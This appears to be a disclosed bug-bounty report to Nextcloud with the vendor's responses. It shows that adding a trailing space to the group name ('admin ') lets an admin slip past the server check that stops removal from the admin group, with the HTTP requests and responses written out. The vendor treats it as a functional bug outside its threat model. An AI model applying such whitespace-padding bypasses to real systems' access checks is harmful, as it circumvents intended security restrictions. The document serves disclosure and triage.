title: Business/Functional logic bypass: Remove admins from admin group.

profile.name: Nextcloud
profile.about: Access, share and protect your files, calendars, contacts, communication & more at home and in your enterprise.

vulnerability_information:
In nextcloud the default admin can not be removed from his admin group. The group toggle request looks like this:

```
POST /nextcloud/index.php/settings/ajax/togglegroups.php HTTP/1.1
Host: 139.59.9.184
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
requesttoken: JQB5F2pqZwh8OUNVRzwVPxdmKCEbJDssbAUcORtfTVM=:bIHyZZPyIV67tsLPsWgrxCInGdOC40f2yD61Qn4HrTw=
OCS-APIREQUEST: true
X-Requested-With: XMLHttpRequest
Cookie: oc1jzqgvx8b9=e6gprie4u2ffkq83ivm68ccp80; oc_sessionPassphrase=BL2ccA7kLG%2FpxKWf5znZSBLWSvARKK%2Bv3oLuCFyGd8a5SAqPeeBjIaD88AVnwnMS8ompIL7tN45YiZeeODdFHyPBYZrZAavWsHJqMKZdvU3U6eZUW%2FHCGLMd62y6ty7P; nc_sameSiteCookielax=true; nc_sameSiteCookiestrict=true
Connection: close
Content-Length: 25

username=test&group=test
```

If we use **admin** as the value of username and **admin ** as the value of group ( admin with a trailing space), the admin will be removed from the admin group.

activities.message:
Thanks a lot for reporting this potential issue back to us!

Our security team will take a look at this issue as soon as possible. We will reply to your report within 72 hours, usually much faster. For obvious reasons we'd like to ask you to not disclose this issue to any other party.

Thanks a lot for your report. Removing an admin from the admin group should be possible for other admins but not for group admins.

What is blocked in the user interface is the ability for admins to remove themselves from the admin section.

I'm thus closing this as informative. If you figure out a creative way to exploit this, please let us know and we'll happily reopen this :)

*What is blocked in the user interface is the ability for admins to remove themselves from the admin section*

An admin can not remove himself from the admin group and this is not just blocked in the ui. There is server side restriction also. Thats why when an admin submits the following request:
```http
POST /nextcloud/index.php/settings/ajax/togglegroups.php HTTP/1.1
Host: 139.59.9.184
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
requesttoken: NgteIVtTXhhcQBgacR8LOQNXeAksCRVtZRB4LnY6eRY=:qBoOkciii/mxBPRVgf7ZOng/Nq+TYURwo8LFicyxGsw=
OCS-APIREQUEST: true
X-Requested-With: XMLHttpRequest
Content-Length: 26
Cookie: oc1jzqgvx8b9=e6gprie4u2ffkq83ivm68ccp80; oc_sessionPassphrase=BL2ccA7kLG%2FpxKWf5znZSBLWSvARKK%2Bv3oLuCFyGd8a5SAqPeeBjIaD88AVnwnMS8ompIL7tN45YiZeeODdFHyPBYZrZAavWsHJqMKZdvU3U6eZUW%2FHCGLMd62y6ty7P; nc_sameSiteCookielax=true; nc_sameSiteCookiestrict=true
Connection: close

username=admin&group=admin
```

In the response he receives:

```http
HTTP/1.1 200 OK
Date: Sat, 18 Jun 2016 18:59:10 GMT
Server: Apache/2.4.7 (Ubuntu)
X-Powered-By: PHP/5.5.9-1ubuntu4.14
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-eval'; style-src 'self' 'unsafe-inline'; frame-src *; img-src * data: blob:; font-src 'self' data:; media-src *; connect-src *
X-XSS-Protection: 1; mode=block
X-Content-Type-Options: nosniff
X-Frame-Options: Sameorigin
X-Robots-Tag: none
X-Download-Options: noopen
X-Permitted-Cross-Domain-Policies: none
Content-Length: 89
Connection: close
Content-Type: application/json; charset=utf-8

{"data":{"message":"Admins can't remove themself from the admin group"},"status":"error"}
```

Here is the bypass of this feature, when `admin ` (with trailing whitespace) is submitted to the server, the server assumes it different thn `admin` (without whitespace) but process the request as `admin` group. As a result a malformed (admin with trailing whitespace) will return this:

```http
HTTP/1.1 200 OK
Date: Sat, 18 Jun 2016 19:01:19 GMT
Server: Apache/2.4.7 (Ubuntu)
X-Powered-By: PHP/5.5.9-1ubuntu4.14
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-eval'; style-src 'self' 'unsafe-inline'; frame-src *; img-src * data: blob:; font-src 'self' data:; media-src *; connect-src *
X-XSS-Protection: 1; mode=block
X-Content-Type-Options: nosniff
X-Frame-Options: Sameorigin
X-Robots-Tag: none
X-Download-Options: noopen
X-Permitted-Cross-Domain-Policies: none
Content-Length: 87
Connection: close
Content-Type: application/json; charset=utf-8

{"data":{"username":"admin","action":"remove","groupname":"admin "},"status":"success"}
```


This is a solid bypass of a application security feature. Rest depends on your decision.
You should have mentioned that any vulnerability related to "admin" group user will be disregarded. As because an admin can do RCE, he can do anything.

Generally speaking we're happy to disclose all reported issues, so are we with this.

We want to note the following however:

> You should have mentioned that any vulnerability related to "admin" group user will be disregarded. 

Here we disagree with using the term "vulnerability". If we take the definition of the word "vulnerability" from https://en.wikipedia.org/wiki/Vulnerability_(computing)#Definitions the general consensus is that a vulnerability is something that allows somebody to escalate their permission.

HackerOne defines a vulnerability in their [Disclosure Guidelines](https://hackerone.com/disclosure-guidelines) the following:

> **Vulnerability:** A software bug that would allow an attacker to perform an action in violation of an expressed security policy. *A bug that enables escalated access or privilege is a vulnerability.* Design flaws and failures to adhere to security best practices may qualify as vulnerabilities. Weaknesses exploited by viruses, malicious code, and social engineering are not considered vulnerabilities unless the Security Team says otherwise in the program's policy.

Our belief is that that this specific issue may qualify as regular functional bug but not as vulnerability per se. As per our [threat model](https://nextcloud.com/security/threat-model/) (which is [tracked in Git](https://github.com/nextcloud/nextcloud.com/blob/master/page-threat-model.php)) an administrator is considered an ultimate trusted unit. 

Considering that administrators can for example execute arbitrary code by applying some theming settings, mounting local storage and so on this is simply not part of our documented threat model.

--- 
Anyhow, we'd like to thank you for reporting this back to us. We hope our response didn't disappoint you and we're looking forward to your next submission.
